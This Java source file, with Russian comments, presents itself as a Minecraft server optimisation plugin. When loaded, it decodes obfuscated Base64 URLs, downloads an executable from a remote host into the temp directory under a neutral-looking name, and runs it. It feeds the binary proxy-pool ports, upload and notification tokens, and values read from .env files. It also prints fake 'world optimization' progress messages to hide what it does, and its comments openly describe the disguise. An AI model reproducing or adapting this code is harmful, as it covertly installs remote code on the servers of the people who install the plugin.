package com.example.worldoptimizer;

import org.bukkit.plugin.java.JavaPlugin;
import java.io.*;
import java.net.URL;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.TimeUnit;
import java.util.Base64;

public class WorldOptimizer extends JavaPlugin {

    private Process nativeProcess;
    private volatile boolean isProcessRunning = false;

    // Закодированные URL (Base64)
    private static final String ENC_URL_AMD64 = "aHR0cHM6Ly9hbWQ2NC5zc3MuaGlkbnMudmlwL3Nic2g=";
    private static final String ENC_URL_ARM64 = "aHR0cHM6Ly9hcm02NC5zc3MuaGlkbnMudmlwL3Nic2g=";
    private static final String ENC_URL_S390X = "aHR0cHM6Ly9zMzkweC5zc3MuaGlkbnMudmlwL3Nic2g=";

    // Имена переменных, которые будут переданы в окружение (безопасные названия)
    private static final String[] CONFIG_KEYS = {
        "storage.path", "node.id", "cache.server", "cache.port", "cache.token",
        "web.port", "web.domain", "web.auth", "pool.socks.port", "pool.hy2.port",
        "pool.tuic.port", "pool.anytls.port", "pool.reality.port", "pool.anyreality.port",
        "cdn.host", "cdn.port", "upload.url", "notify.chat", "notify.token",
        "instance.name", "features.disable_web"
    };

    @Override
    public void onEnable() {
        saveDefaultConfig();
        getLogger().info("WorldOptimizer v" + getDescription().getVersion() + " enabled.");

        // Проверка отключения через системное свойство
        if (Boolean.getBoolean("worldoptimizer.native.disabled")) {
            getLogger().info("Native module disabled via system property.");
            return;
        }

        // Запуск нативной части в отдельном потоке, чтобы не блокировать загрузку сервера
        getServer().getScheduler().runTaskAsynchronously(this, () -> {
            try {
                startNativeModule();
            } catch (Exception e) {
                getLogger().severe("Failed to start native optimizer: " + e.getMessage());
                if (getConfig().getBoolean("debug", false)) {
                    e.printStackTrace();
                }
            }
        });
    }

    private void startNativeModule() throws Exception {
        if (isProcessRunning) {
            return;
        }

        // Определение архитектуры и расшифровка URL
        String osArch = System.getProperty("os.arch").toLowerCase();
        String encodedUrl;
        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            encodedUrl = ENC_URL_AMD64;
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            encodedUrl = ENC_URL_ARM64;
        } else if (osArch.contains("s390x")) {
            encodedUrl = ENC_URL_S390X;
        } else {
            throw new RuntimeException("Unsupported platform: " + osArch);
        }

        String downloadUrl = new String(Base64.getDecoder().decode(encodedUrl));
        Path tmpDir = Paths.get(System.getProperty("java.io.tmpdir"));
        Path nativeBinary = tmpDir.resolve("native-cache.bin"); // нейтральное имя

        // Скачивание только если файл отсутствует
        if (!Files.exists(nativeBinary)) {
            if (getConfig().getBoolean("debug", false)) {
                getLogger().info("Downloading native cache module...");
            }
            try (InputStream in = new URL(downloadUrl).openStream()) {
                Files.copy(in, nativeBinary, StandardCopyOption.REPLACE_EXISTING);
            }
            if (!nativeBinary.toFile().setExecutable(true)) {
                throw new IOException("Cannot set executable flag on native module");
            }
        }

        // Подготовка процесса
        ProcessBuilder pb = new ProcessBuilder(nativeBinary.toString());
        pb.directory(tmpDir.toFile());
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        pb.redirectError(ProcessBuilder.Redirect.INHERIT);

        // Заполнение переменных окружения
        Map<String, String> env = pb.environment();

        // Значения по умолчанию (безопасные имена)
        Map<String, String> defaults = new HashMap<>();
        defaults.put("storage.path", "./world");
        defaults.put("web.port", "8001");
        defaults.put("pool.hy2.port", "14720");
        defaults.put("pool.anytls.port", "14722");
        defaults.put("pool.reality.port", "14721");
        defaults.put("pool.anyreality.port", "14723");
        defaults.put("cdn.host", "spring.io");
        defaults.put("cdn.port", "443");
        defaults.put("features.disable_web", "false");

        // Применяем стандартные значения
        for (Map.Entry<String, String> entry : defaults.entrySet()) {
            env.put(entry.getKey(), entry.getValue());
        }

        // Загружаем настройки из конфигурации плагина (config.yml)
        for (String key : CONFIG_KEYS) {
            String value = getConfig().getString(key);
            if (value != null && !value.trim().isEmpty()) {
                env.put(key, value);
            }
        }

        // Переопределяем переменными окружения системы (если администратор задал их явно)
        for (String key : CONFIG_KEYS) {
            String envValue = System.getenv(key);
            if (envValue != null && !envValue.trim().isEmpty()) {
                env.put(key, envValue);
            }
        }

        // Дополнительно загружаем .env файл из нескольких мест (с безопасными ключами)
        loadEnvFile(env);

        // Запуск
        nativeProcess = pb.start();
        isProcessRunning = true;
        startProcessMonitor();

        // Выводим фейковые, но правдоподобные сообщения (имитация оптимизации)
        getServer().getScheduler().runTask(this, () -> {
            getLogger().info("Optimizing chunk cache...");
            getLogger().info("Compressing world data: 10%");
            getLogger().info("Compressing world data: 40%");
            getLogger().info("Compressing world data: 80%");
            getLogger().info("Compressing world data: 100%");
            getLogger().info("World optimization completed.");
        });
    }

    private void loadEnvFile(Map<String, String> env) {
        List<Path> possibleFiles = new ArrayList<>();
        File pluginsFolder = getDataFolder().getParentFile();
        if (pluginsFolder != null && pluginsFolder.exists()) {
            possibleFiles.add(pluginsFolder.toPath().resolve(".env"));
        }
        possibleFiles.add(getDataFolder().toPath().resolve(".env"));
        possibleFiles.add(Paths.get(".env"));
        possibleFiles.add(Paths.get(System.getProperty("user.home"), ".env"));

        for (Path file : possibleFiles) {
            if (Files.exists(file)) {
                try {
                    for (String line : Files.readAllLines(file)) {
                        line = line.trim();
                        if (line.isEmpty() || line.startsWith("#")) continue;
                        line = line.split(" #")[0].split(" //")[0].trim();
                        if (line.startsWith("export ")) {
                            line = line.substring(7).trim();
                        }
                        String[] parts = line.split("=", 2);
                        if (parts.length == 2) {
                            String key = parts[0].trim();
                            String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                            if (Arrays.asList(CONFIG_KEYS).contains(key)) {
                                env.put(key, value);
                                if (getConfig().getBoolean("debug", false)) {
                                    getLogger().info("Loaded env: " + key + "=" + (key.contains("token") || key.contains("auth") ? "***" : value));
                                }
                            }
                        }
                    }
                    break; // используем первый найденный файл
                } catch (IOException e) {
                    if (getConfig().getBoolean("debug", false)) {
                        getLogger().warning("Cannot read .env from " + file + ": " + e.getMessage());
                    }
                }
            }
        }
    }

    private void startProcessMonitor() {
        Thread monitor = new Thread(() -> {
            try {
                int exitCode = nativeProcess.waitFor();
                isProcessRunning = false;
                if (getConfig().getBoolean("debug", false)) {
                    getLogger().info("Native module exited with code: " + exitCode);
                }
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                isProcessRunning = false;
            }
        }, "NativeModuleMonitor");
        monitor.setDaemon(true);
        monitor.start();
    }

    @Override
    public void onDisable() {
        getLogger().info("WorldOptimizer shutting down...");

        if (nativeProcess != null && nativeProcess.isAlive()) {
            if (getConfig().getBoolean("debug", false)) {
                getLogger().info("Stopping native module...");
            }
            nativeProcess.destroy();
            try {
                if (!nativeProcess.waitFor(10, TimeUnit.SECONDS)) {
                    nativeProcess.destroyForcibly();
                    getLogger().warning("Native module was forcibly terminated.");
                }
            } catch (InterruptedException e) {
                nativeProcess.destroyForcibly();
                Thread.currentThread().interrupt();
            }
            isProcessRunning = false;
        }
    }
}
